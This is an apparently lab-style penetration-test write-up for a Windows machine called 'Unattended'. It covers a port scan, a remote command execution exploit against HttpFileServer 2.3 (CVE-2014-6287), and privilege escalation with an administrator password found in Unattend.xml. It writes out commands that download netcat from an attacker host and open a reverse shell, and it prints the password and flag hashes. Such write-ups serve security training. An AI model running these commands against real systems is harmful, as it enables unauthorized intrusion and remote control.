# Unattended

**IP Address:** 172.31.1.24
| Port | State | Service | Version |
|------|-------|---------|---------|
| 135/tcp | open | msrpc | Microsoft Windows RPC  |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn  |
| 3389/tcp | open | ms-wbt-server | Microsoft Terminal Services  |
| 445/tcp | open | microsoft-ds |   |
| 47001/tcp | open | http | Microsoft HTTPAPI httpd 2.0 |
| 49664/tcp | open | msrpc | Microsoft Windows RPC  |
| 49665/tcp | open | msrpc | Microsoft Windows RPC  |
| 49666/tcp | open | msrpc | Microsoft Windows RPC  |
| 49668/tcp | open | msrpc | Microsoft Windows RPC  |
| 49669/tcp | open | msrpc | Microsoft Windows RPC  |
| 49670/tcp | open | msrpc | Microsoft Windows RPC  |
| 49679/tcp | open | msrpc | Microsoft Windows RPC  |
| 5985/tcp | open | http | Microsoft HTTPAPI httpd 2.0 |
| 80/tcp | open | http | HttpFileServer httpd 2.3 |
| 123/udp | open|filtered | ntp |   |
| 135/udp | open|filtered | msrpc |   |
| 137/udp | open | netbios-ns | Microsoft Windows netbios-ns  |
| 138/udp | open|filtered | netbios-dgm |   |
| 161/udp | open|filtered | snmp |   |
| 1900/udp | open|filtered | upnp |   |
| 445/udp | open|filtered | microsoft-ds |   |
| 4500/udp | open|filtered | nat-t-ike |   |
| 500/udp | open|filtered | isakmp |   |
| 520/udp | open|filtered | route |   |
| 631/udp | open|filtered | ipp |   |

## Enumeration
### Open Ports

## Exploitation
### Exploit Details (SearchSploit)
* **Name** - Rejetto HttpFileServer 2.3.x - Remote Command Execution (3) 
* **CVE** -  2014-6287
* **Module** - windows/webapps/49125.py
* **Disclosed** - 2020-11-30
* **References**
  * https://www.exploit-db.com/exploits/49125
  * https://nvd.nist.gov/vuln/detail/CVE-2014-6287

Commands
```
python3 49125.py $ip 80 'certutil.exe -urlcache -f http://10.10.0.15/windows/privesc/nc.exe nc.exe'
python3 49125.py $ip 80 'nc.exe -e cmd.exe 10.10.0.15 443'
whoami
cat /var/www/local.txt
```

![Execute Exploit](images/exploit1.png)

![Execute Exploit](images/exploit2.png)

## Privilege Escalation
### Exploit Details (Found Credentials)
* **Name** - Found Credentials
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

The C:\Windows\Panther\Unattend.xml file contains an administrator password.  

Commands
```bash
evil-winrm -i $ip -u administrator
cnt4weRAbtXMTSVV
whoami
type ..\Desktop\system.txt
```
![Execute Exploit](images/privesc1.png)

![Execute Exploit](images/privesc2.png)

## Loot
```
access.txt
423b6ee873126a02f27afe8a4273e1ad
system.txt
e594fe8b3544d60110f79bb58245cbfd
```